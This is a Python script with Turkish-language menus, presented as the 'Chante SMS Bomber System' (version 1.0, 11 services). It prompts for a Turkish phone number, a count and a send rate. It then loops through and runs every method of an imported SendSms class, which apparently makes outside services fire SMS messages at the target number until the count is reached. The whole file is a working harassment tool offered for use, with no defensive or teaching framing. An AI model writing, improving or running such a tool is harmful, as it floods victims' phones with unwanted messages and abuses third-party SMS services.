from colorama import Fore, Style
from sms import SendSms
from time import sleep
from os import system
from requests import get


while 1:
    system("cls||clear")

    hosgeldin_yazisi = """
    ______________________________________________________
    |                                                    |
    |             Chante SMS Bomber System               |
    |                                                    |
    | [--] Toplam Servis: 11                             |
    |                                                    |
    | [--] Sürüm: 1.0                                    |
    |____________________________________________________|
    """
    
    
    print(hosgeldin_yazisi)

    try:
        menu = int(input(Fore.LIGHTMAGENTA_EX + "1. Başlat\n2. Çıkış\n\n" + Fore.LIGHTYELLOW_EX + "Seçim: "))
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Yanlış argüman girildi!")
        sleep(3)
        continue
    if menu == 1:
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "+90"+ Fore.LIGHTGREEN_EX, end="")
            tel_no = int(input())
            if len(str(tel_no)) != 10:
                raise ValueError
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Yanlış numara girildi!") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Thread Sayısı: "+ Fore.LIGHTGREEN_EX, end="")
            kere = int(input())
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Yanlış argüman girildi!") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Gönderme Hızı (0-10): "+ Fore.LIGHTGREEN_EX, end="")
            aralik = int(input())
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Yanlış argüman girildi!") 
            sleep(3)
            continue
        system("cls||clear")
        sms = SendSms(str(tel_no))
        while sms.adet < kere:
            for attribute in dir(SendSms):
                attribute_value = getattr(SendSms, attribute)
                if callable(attribute_value):
                    if attribute.startswith('__') == False:
                        if sms.adet == kere:
                            break
                        exec("sms."+attribute+"()")
                        sleep(aralik)
        print(Fore.LIGHTGREEN_EX + "\nSMS Gönderme işlemi başarıyla bitirildi. Geri dönmek için 'ENTER' tuşuna bas.")
        input()
    elif menu == 2:
        system("cls||clear")
        print(Fore.LIGHTGREEN_EX + "Görüşürüz")
        break
